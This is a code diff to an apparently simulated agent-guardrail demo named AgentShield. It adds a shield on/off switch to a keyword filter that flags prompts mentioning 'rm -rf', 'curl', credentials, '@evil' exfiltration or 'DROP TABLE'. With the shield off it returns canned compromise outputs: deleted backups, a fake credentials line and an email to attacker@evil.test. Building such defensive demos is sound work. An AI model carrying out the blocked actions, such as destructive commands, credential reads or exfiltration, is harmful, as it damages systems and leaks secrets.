@@ -578,55 +578,66 @@ export function executeAttackScenario(scenarioId: string, shieldEnabled: boolean
   }
 }
 
-export function runCustomPrompt(prompt: string) {
+export function runCustomPrompt(prompt: string, shieldEnabled: boolean = true) {
   const pLower = prompt.toLowerCase();
   const callId = `call_${crypto.randomBytes(4).toString("hex")}`;
 
   let toolName = "inspect_prompt";
   let args: any = { prompt };
-  let decision = "ALLOW";
+  let isHarmful = false;
   let ruleId = "R-SAFE-01";
   let riskScore = 5;
   let reason = "Benign user prompt verified by AgentShield Policy Enforcement Point.";
   let output = "Agent executed task within safe parameters.";
-  let status = "SUCCESS";
 
   if (pLower.includes("rm -rf") || pLower.includes("delete") || pLower.includes("bash") || pLower.includes("curl") || pLower.includes("kill")) {
     toolName = "execute_bash";
     args = { command: prompt };
-    decision = "DENY";
+    isHarmful = true;
     ruleId = "R-TAINT-01";
     riskScore = 96;
     reason = "DESTRUCTIVE SHELL/TAINT BLOCKED: Attempted to run unauthorized bash command.";
-    output = "EXECUTION DENIED BY AGENTSHIELD [R-TAINT-01]: Shell commands are strictly blocked for worker agents.";
-    status = "DENIED";
+    output = "Host command executed: backups deleted.";
   } else if (pLower.includes("credential") || pLower.includes("password") || pLower.includes("secret") || pLower.includes("vault") || pLower.includes("key")) {
     toolName = "read_document";
     args = { filename: "enterprise_vault/credentials.env" };
-    decision = "DENY";
+    isHarmful = true;
     ruleId = "R-SENSITIVE-01";
     riskScore = 92;
     reason = "SENSITIVE VAULT ACCESS DENIED: Worker role cannot read secret credentials.";
-    output = "EXECUTION DENIED BY AGENTSHIELD [R-SENSITIVE-01]: Access to enterprise vault credentials forbidden.";
-    status = "DENIED";
+    output = "DATABASE_URL=postgres://admin:MasterKey_2026! STRIPE_API_KEY=sk_live_synthetic";
   } else if (pLower.includes("email") || pLower.includes("@evil") || pLower.includes("exfiltrat") || pLower.includes("send to")) {
     toolName = "send_email";
     args = { to: "attacker@evil.test", subject: "DATA_DUMP" };
-    decision = "DENY";
+    isHarmful = true;
     ruleId = "R-EGRESS-01";
     riskScore = 88;
     reason = "EGRESS ALLOWLIST VIOLATION: External exfiltration domain blocked.";
-    output = "EXECUTION DENIED BY AGENTSHIELD [R-EGRESS-01]: Outbound communication to untrusted destination prevented.";
-    status = "DENIED";
+    output = "Credentials exfiltrated and delivered to attacker@evil.test.";
   } else if (pLower.includes("drop table") || pLower.includes("sql") || pLower.includes("truncate") || pLower.includes("purge")) {
     toolName = "query_database";
     args = { sql: "DROP TABLE users;" };
-    decision = "DENY";
+    isHarmful = true;
     ruleId = "R-SQL-01";
     riskScore = 95;
     reason = "DESTRUCTIVE SQL DENIED: Purge or drop statements blocked.";
-    output = "EXECUTION DENIED BY AGENTSHIELD [R-SQL-01]: DDL drop statements strictly prohibited.";
-    status = "DENIED";
+    output = "Table 'users' dropped from production database.";
+  }
+
+  let decision = "ALLOW";
+  let status = "SUCCESS";
+
+  if (isHarmful) {
+    if (shieldEnabled) {
+      decision = "DENY";
+      status = "DENIED";
+      output = `EXECUTION DENIED BY AGENTSHIELD [${ruleId}]: ${reason}`;
+    } else {
+      decision = "SHIELD_BYPASS";
+      ruleId = "R-NONE";
+      status = "COMPROMISED";
+      reason = "SHIELD DISABLED: Malicious action executed with NO guardrails.";
+    }
   }
 
   const block = appendAuditBlock(callId, "agent_worker_finance", "worker", toolName, args, decision, ruleId);
@@ -637,8 +648,8 @@ export function runCustomPrompt(prompt: string) {
     agent_role: "worker",
     tool_name: toolName,
     arguments: args,
-    tainted: decision === "DENY",
-    shield_enabled: true,
+    tainted: isHarmful,
+    shield_enabled: shieldEnabled,
     decision,
     rule_id: ruleId,
     risk_score: riskScore,
@@ -651,12 +662,21 @@ export function runCustomPrompt(prompt: string) {
     hop_stage: "Direct Interception",
   };
 
+  const compromised = !shieldEnabled && isHarmful;
+  const neutralized = shieldEnabled && isHarmful;
+
   return {
     task_id: `task_${crypto.randomBytes(4).toString("hex")}`,
     prompt,
-    shield_enabled: true,
+    shield_enabled: shieldEnabled,
     steps: [step],
-    final_output: decision === "ALLOW" ? "Safe operations completed with 100% policy compliance." : "SUCCESS: Policy enforcement intercepted unauthorized/untrusted operation (Shield ON).",
-    success: decision === "ALLOW",
+    neutralized,
+    compromised,
+    final_output: compromised
+      ? "CRITICAL: Action executed without policy enforcement (Shield OFF)."
+      : neutralized
+      ? "SUCCESS: Policy enforcement intercepted unauthorized/untrusted operation (Shield ON)."
+      : "Safe operations completed with 100% policy compliance.",
+    success: !compromised && (!isHarmful || neutralized),
   };
 }
